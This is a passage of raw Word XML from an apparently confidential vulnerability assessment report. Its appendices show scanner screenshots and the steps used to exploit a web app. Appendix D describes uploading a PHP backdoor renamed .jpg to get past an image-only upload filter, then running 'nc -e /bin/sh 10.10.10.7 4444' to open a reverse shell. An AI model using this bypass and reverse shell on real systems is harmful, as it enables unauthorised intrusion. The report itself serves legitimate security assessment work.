          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"}')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="_Toc143392754"/>
      <w:r>
        <w:t xml:space="preserve">Appendix C: </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Screenshots For Nessus &amp; Faraday</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w:rsidR="00C95900" w:rsidRDefault="00C95900" w:rsidP="00C95900">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:t>I. Nessus Automated Scan:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C95900" w:rsidRDefault="0052454B" w:rsidP="00C95900">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0052454B">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="477868AF" wp14:editId="7154E873">
            <wp:extent cx="5943600" cy="2519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9680"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0052454B" w:rsidRDefault="0052454B" w:rsidP="00C95900">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0052454B">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="61666CAD" wp14:editId="31640E14">
            <wp:extent cx="5943600" cy="251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6505"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0052454B" w:rsidRDefault="0052454B" w:rsidP="00C95900">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0052454B">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="667CD7F3" wp14:editId="5E757871">
            <wp:extent cx="5943600" cy="2511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11425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A7001E" w:rsidRDefault="00A7001E" w:rsidP="00C95900">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C95900" w:rsidRDefault="00C95900" w:rsidP="00C95900">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t>II. Faraday screenshot</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C227A" w:rsidRDefault="005C227A" w:rsidP="00C95900">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C227A">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B9A67DB" wp14:editId="4D8F3079">
            <wp:extent cx="5943600" cy="2804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4160"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C95900" w:rsidRPr="00C95900" w:rsidRDefault="005C227A" w:rsidP="00C95900">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C227A">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09436BBA" wp14:editId="7A8862E8">
            <wp:extent cx="5943600" cy="2757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57805"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A7001E" w:rsidRDefault="00A7001E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc143392755"/>
      <w:r>
        <w:t xml:space="preserve">Appendix D: </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Screenshots Of Exploited Web App</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRPr="000C130A" w:rsidRDefault="00FB29CA" w:rsidP="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C130A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Found the credential for access the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000C130A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>secureapp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000C130A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> path</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRPr="00FB29CA" w:rsidRDefault="00FB29CA" w:rsidP="00FB29CA">
      <w:r w:rsidRPr="00FB29CA">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D476227" wp14:editId="168D6662">
            <wp:extent cx="5943600" cy="2689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89860"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRDefault="00FB29CA" w:rsidP="00FB29CA"/>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FB29CA" w:rsidRPr="00E7170F" w:rsidRDefault="00A7001E" w:rsidP="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FB29CA">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251663360" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="499D8CE0" wp14:editId="3C324DF5">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>right</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>169545</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="36442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anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00FB29CA" w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">2. Uploaded </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FB29CA" w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>backdoor.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FB29CA" w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> file (renamed to backdoor.php.jpg for bypass image allowed only upload)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRDefault="00FB29CA" w:rsidP="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRDefault="00FB29CA" w:rsidP="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRPr="00E7170F" w:rsidRDefault="00FB29CA" w:rsidP="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Executing the backdoor file (on path http://example.com/secureapp/uploads/backdoor.php.jpg?</w:t>
      </w:r>
      <w:r w:rsidR="00E7170F" w:rsidRPr="00E7170F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E7170F" w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>c=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E7170F" w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E7170F" w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> -e /bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E7170F" w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E7170F" w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.10.10.7 4444</w:t>
      </w:r>
      <w:r w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRDefault="00FB29CA" w:rsidP="00FB29CA">
      <w:r w:rsidRPr="00FB29CA">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70E58F03" wp14:editId="31AC4C38">
            <wp:extent cx="5943600" cy="265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55570"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRDefault="00FB29CA" w:rsidP="00FB29CA"/>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A7001E" w:rsidRDefault="00A7001E" w:rsidP="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRPr="00E7170F" w:rsidRDefault="00FB29CA" w:rsidP="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E7170F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>4. Getting shell access (by open a listening port 4444 on analysis machine)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRDefault="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FB29CA">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="39F4CA00" wp14:editId="7EF62AAD">
            <wp:extent cx="5943600" cy="3430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30270"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRDefault="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRDefault="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FB29CA" w:rsidRDefault="00FB29CA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc143392756"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Appendix E: </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>OSINT / Phishing Results Data Used</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRPr="004405F8" w:rsidRDefault="004405F8">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004405F8">
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251664384" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3AB3E6C6" wp14:editId="22A91977">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>right</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>195671</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="29394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anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00027C4C" w:rsidRPr="004405F8">
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:t>1. Found there is a file upload exists somewhere</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRPr="004405F8" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004405F8">
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251665408" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="654B6BCD" wp14:editId="19738552">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>right</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>261801</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="20612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anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="004405F8">
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:t>2. Found out there is something on the path /secureapp</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>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A7001E" w:rsidRDefault="00A7001E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRPr="004405F8" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004405F8">
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>3. Found out some user on WP</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00027C4C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="715E824C" wp14:editId="29DFF32E">
            <wp:extent cx="5943600" cy="3594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94735"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRPr="004405F8" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004405F8">
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251666432" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="117914D5" wp14:editId="6D20EAB8">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-9706</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>208462</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="26555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anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="004405F8">
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:t>4. Found out some credential can be tested for /wp-admin and /secureapp path</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C7660E" w:rsidRDefault="00C7660E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C7660E" w:rsidRDefault="00C7660E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C7660E" w:rsidRDefault="00C7660E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C7660E" w:rsidRDefault="00C7660E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C7660E" w:rsidRDefault="00C7660E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C7660E" w:rsidRDefault="00C7660E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRDefault="00C7660E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>5. List out credentials can be tested</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C7660E" w:rsidRPr="00C7660E" w:rsidRDefault="00C7660E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C7660E">
        <w:rPr>
          <w:b/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B41F5DF" wp14:editId="6C881A89">
            <wp:extent cx="5943600" cy="158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7500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00027C4C" w:rsidRDefault="00027C4C">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRPr="00FB29CA" w:rsidRDefault="00EE4E89">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EE4E89">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="55892C21" wp14:editId="4D03FAB9">
            <wp:extent cx="5943600" cy="3762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62375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:bookmarkStart w:id="34" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="34"/>
    </w:p>
    <w:sectPr w:rsidR="00944875" w:rsidRPr="00FB29CA">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3C5" w:rsidRDefault="007A53C5">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="007A53C5" w:rsidRDefault="007A5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0FF" w:rsidRDefault="002070F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0FF" w:rsidRDefault="002070FF">
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="12" w:space="0" w:color="000000"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="center" w:pos="-3240"/>
        <w:tab w:val="left" w:pos="0"/>
        <w:tab w:val="right" w:pos="9090"/>
      </w:tabs>
      <w:spacing w:after="120"/>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t>Vulnerability Assessment Report – EXCCORP-VLN-18JAN2021 Company Confidential</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:tab/>
      <w:t xml:space="preserve">Page </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:instrText>PAGE</w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00315CB9">
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:noProof/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t>27</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r>
      <w:rPr>
